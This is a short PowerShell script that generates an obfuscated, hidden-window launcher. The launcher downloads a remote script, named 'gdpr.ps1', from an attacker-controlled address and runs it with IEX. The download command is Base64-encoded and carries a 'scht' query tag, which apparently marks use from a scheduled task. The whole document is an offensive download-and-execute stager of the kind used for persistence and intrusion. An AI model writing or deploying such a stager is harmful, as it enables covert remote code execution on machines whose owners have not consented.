$PAYLOAD_URL="http://10.x.y.z:port/overdue/gdpr.ps1"

$UT="(New-TimeSpan -Start '01/01/1970' -End (Get-Date)).TotalSeconds"
$INVOKER="powershell -Sta -Nop -Window Hidden -EncodedCommand "
$SEPERATOR="?l=scht&t="

$PAYLOAD=$PAYLOAD_URL+$SEPERATOR

$COMMAND="`$UT=$UT; IEX (New-Object Net.WebClient).DownloadString('$PAYLOAD'+`$UT)"
$ENCODED=[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($COMMAND))

$INVOKER+$ENCODED